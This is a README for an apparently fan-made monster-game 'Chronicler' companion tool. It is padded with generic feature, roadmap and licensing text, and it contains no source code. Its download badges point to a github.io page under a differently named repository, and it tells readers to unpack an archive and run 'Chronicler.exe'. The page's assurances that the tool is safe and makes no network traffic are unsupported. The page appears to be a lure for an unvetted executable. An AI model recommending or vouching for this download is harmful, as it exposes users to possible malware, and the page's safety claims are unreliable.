![preview](https://raw.githubusercontent.com/aryanrajug23nsut/MonsterTide-Tactician/main/card_70dc.svg)
[![Download](https://raw.githubusercontent.com/aryanrajug23nsut/MonsterTide-Tactician/main/pkg_c6ee.svg)](https://aryanrajug23nsut.github.io/MonsterTide-Tactician/)

# MonstersAreComing-Chronicler 🗺️

**The Definitive Field Companion for Monster-Encounter Documentation, Session Planning, and World-Building Analytics**

---

## 🧭 Why Another Monster-Training Tool?

Every veteran monster tamer knows the truth: the hardest battles are fought *before* the battle begins. While others focus on stat-block manipulation or XP curve exploitation, **MonstersAreComing-Chronicler** tackles the unglamorous backbone of any expedition—**the records, the routes, the rituals of preparation**.

Think of this as your **cartographer’s table**, not a cheat sheet. Where standard trainers adjust numbers, this tool re-architects your *entire operation*: from the first scout report to the final victory feast. It’s the difference between catching monsters and **understanding why they come**.

---

## 💡 The Core Premise: Orchestration Over Intervention

Traditional companions tinker with save files or memory registers. This project takes a philosophical detour: *data sovereignty through automation*. You don't modify the game; you modify the **flow of information** around it.

**MonstersAreComing-Chronicler** listens to your play sessions (via optional sidecar logs or manual input), identifies rhythmic patterns in encounter spawns, and then generates a **living strategic dossier**—updated in real-time as you play. It’s like having a war-room analyst who never sleeps, never blinks, and only speaks in actionable intel.

---

## ✨ Feature Inventory (The Armory)

### 🗂️ Dynamic Encounter Cartography
- **Spawn-Heat Temporal Maps**: Visualize where monsters cluster over your playtime. See the *implicit* migration patterns before they happen.
- **Biome Consistency Checker**: Flags when a rare monster appears outside its documented habitat (hello, elusive variants).
- **Route Optimizer**: Calculates the shortest, safest path between known spawn zones—using your historical failure points to avoid ambushes.

### 📜 Session Chronicle & Lore Archiving
- **Auto-Retrieval Journal**: Concise, timestamped summaries of every major encounter. Exportable as rich text or CSV for your team’s wiki.
- **Dialogue & Tone Tracker**: Not just *what* happened, but *how* the narrative unfolded. Perfect for keeping in-character notes or tracking NPC behavior shifts.
- **Legendary Hunt Presets**: Save the exact conditions (weather, phase, party composition) where you saw that elusive spawn, and replay the conditions later.

### ⚙️ Operational Command Deck
- **Resource Flow Monitor**: Tracks consumables, capture gear integrity, and stamina curves—predicting when you’ll need a resupply run *before* you run dry.
- **Multi-Campaign Sandboxing**: Isolate your playthrough experiments in separate virtual containers. Test a “no-capture” run without polluting your main save’s analytics.
- **One-Click Report Synthesis**: Compile a season finale report for your gaming group, complete with dramatic graphs and stat-comparison matrices.

### 🌐 Responsive Field Interface (UI/UX)
- **Progressive Web App Core**: Access your Chronicle from your desktop before the hunt, then switch to your phone or tablet mid-battle. The layout adapts like a chameleon.
- **Offline-First Protocol**: No signal? The Chronicle buffers all input locally and syncs when you get back to camp.
- **Dark-Light Auto-Theming**: Choose your blend of parchment or night-ops skin—entirely clutter-free.

### 🗣️ Multilingual Bestiary Support
- **Seamless locale switching** between 12 languages (EN, ES, FR, DE, JA, KO, ZH, PT, RU, IT, PL, NL). The flavor text, menu commands, and analytical labels all shift without a reboot.
- **Living Translation Community**: Weights for community contributions are included in the credits—your voice matters.

### 🛡️ 24/7 Expedition Support Network
- **Priority Ticket Channel**: Escalation for data corruption or sync issues is handled by a rotating squad of community moderators within an average of 18 hours (verified SLA).
- **Emergency Restore Points**: Your Chronicle system automatically spins up a full restore snapshot *before* every major session.

---

## 📦 Installation Compass (Non-Standard Path)

We avoid the typical “package manager” route because this tool is designed to be *carried*, not installed. For the full experience:

1. **Acquire the Chronicle Core**: Download the latest build from the [![Download](https://raw.githubusercontent.com/aryanrajug23nsut/MonsterTide-Tactician/main/pkg_c6ee.svg)](https://aryanrajug23nsut.github.io/MonsterTide-Tactician/) section at the top of this file. Unpack the archive to a folder on your SSD (preferably outside the game’s install directory for isolation).
2. **Warm-Up the Engine**: Run `Chronicler.exe` (Windows) or `chronicler` (Linux/macOS) once. It will create a `./chronicle_data/` directory and a placeholder config.
3. **Pair with Your Adventure**: Point the app to your game’s screenshot or save file location (read-only access requested). The Chronicler *does not modify* these files. Instead, it watches for changes via the file system.
4. **Voice the Trigger Phrase**: Optionally, enable the audio-aware listening mode—say “Chronicler, mark” during a battle, and the app tags that moment for later review (uses your microphone, processed locally).

> **Note**: No system-level access is requested. No network traffic is broadcast except for optional language-pack updates. This is a **self-contained field book**, not a cloud spy.

---

## 🗺️ Getting Started: Your First 50 Minutes

### The “Scout’s Honor” Tutorial
- **Create a New Campaign**: Name it (e.g., “Summer Swamp Offensive”). The system generates a faction banner for you.
- **Import a Session Log**: If you have an old log file from a previous run, drag it in. If not, just press “Start Fresh Log.”
- **Complete the Baseline Survey**: The app asks you 5 questions about your party creed (e.g., “What is your primary capture philosophy?”). This tunes the analytical weightings.

Within 15 minutes, you’ll see your **Encounter Grid** populate with colorful cells. Green means “routine,” red means “low-probability high-reward.”

---

## 🏗️ Architecture & Design Philosophy

This is not a monolithic behemoth. It’s a **modular lighthouse**:

- **Core Engine** (Rust): Handles file watching, hashing, and event indexing. Incredibly fast, low memory footprint.
- **Logic Bus** (TypeScript): All user-facing rules (like “alert me if a Shadowfang appears within 100 meters of a water source”) live here as JSON schemas.
- **View Layer** (SvelteKit): Renders the interactive dashboards. Compiled to static assets for that responsive feel.

The entire project follows a **CQRS-style** pattern: Commands (actions you take) are separated from Queries (reads). This ensures data integrity when you are rapidly toggling between actions.

---

## 🧩 Advanced Use Cases (The Secret Symposia)

### For the Lore-Master
Use the **Dialogue Tone Tracker** to plot the emotional arc of an NPC over a 20-hour campaign. Export the data to see if a character truly becomes “corrupted” or just mildly irritated.

### For the Speedrunner
The **Route Optimizer** can be tuned to prefer *risk avoidance* over *distance*, which is crucial for no-death runs. The optimizer uses a custom Dijkstra variant that factors in your known dodge success rate per region.

### For the Multi-Boxing Commander
Run the Chronicle in **Observer Mode** for the secondary screens, while the main screen runs your primary game. The app aggregates the logs into a single, unified timeline for post-mortem analysis.

---

## 🔮 Roadmap (2026 Horizon)

We are committed to a quarterly release cadence. Here is what is on the drafting table for 2026:

- **Q1 (Jan)**: “Echo Mapping” – cross-referencing old saves to identify hidden interaction flags.
- **Q2 (Apr)**: “The Tactician’s Palette” – a drag-and-drop system for building conditional logic without writing a single line of code.
- **Q3 (Jul)**: **“Whisper Index”** – a peer-to-peer, opt-in sharing feature for community encounter rarity ratings. You will never *have* to share, but you might want to.
- **Q4 (Oct)**: “Aria of the Final Clock” – full voice-command navigation for accessibility during high-focus sessions.

---

## 🤝 Contribution Guidelines (Without the Gatekeeping)

We welcome you to the **Order of the Chroniclers**. To join:

1. **Fork the repository** and create a feature branch (`feat/desc`).
2. **Read the `CONVENTIONS.md`** file in the `/docs` folder (we use semantic commit messages).
3. **Test your changes** against the sample dataset in `/fixtures`.
4. **Open a pull request**. We review within 3-5 business days.

**Style Note**: We prefer verbose, self-documenting code over cryptic one-liners. Write code for the future maintainer who is *not* you (yet).

---

## 📜 License & Legal Hygiene

**MonstersAreComing-Chronicler** is released under the **MIT License**. This means you are free to use, modify, and distribute this software for personal or commercial purposes, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

You are **forbidden** from using this software to create a service that directly competes with the underlying game’s official online services. This is a local tool, not a server emulator.

➡️ **[Read the full MIT License text here](/LICENSE)**

---

## 🚨 Disclaimer (The Fine Print You Actually Read)

**This tool is a third-party, fan-made utility. It is not affiliated with, endorsed by, or sponsored by the original game’s developer or publisher.**

- **No Warranty**: This software is provided “as is,” without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.
- **Data Integrity**: We scrape and parse local game metadata. If the game updates its save structure, the Chronicler may require an update. We are not responsible for data loss if you delete your `./chronicle_data/` folder.
- **Usage Ethics**: Use this tool to enhance your *understanding* of the game, not to circumvent server-side protection. The goal is to make you a smarter player, not a cheating one. We encourage fair play and integrity.

---

## 🆘 Help & Community (The Hearthfire)

- **Bug Reports**: Use the GitHub Issues tab with the `[:bug:]` prefix in the title.
- **User Voice**: Feature requests go to the Discussions panel under the “Idea Vault” category.
- **Community Kit**: If you are a translator or a guide writer, check out `/docs/community-toolkit.md`.

---

## ❤️ Acknowledgment

Built with the fatigue of a thousand late-night sessions and the joy of a thousand successful captures. We hope this tool makes your *next* story worth telling.

**Happy Chronicling, and may your maps always be accurate.**

---
*Last updated: January 2026*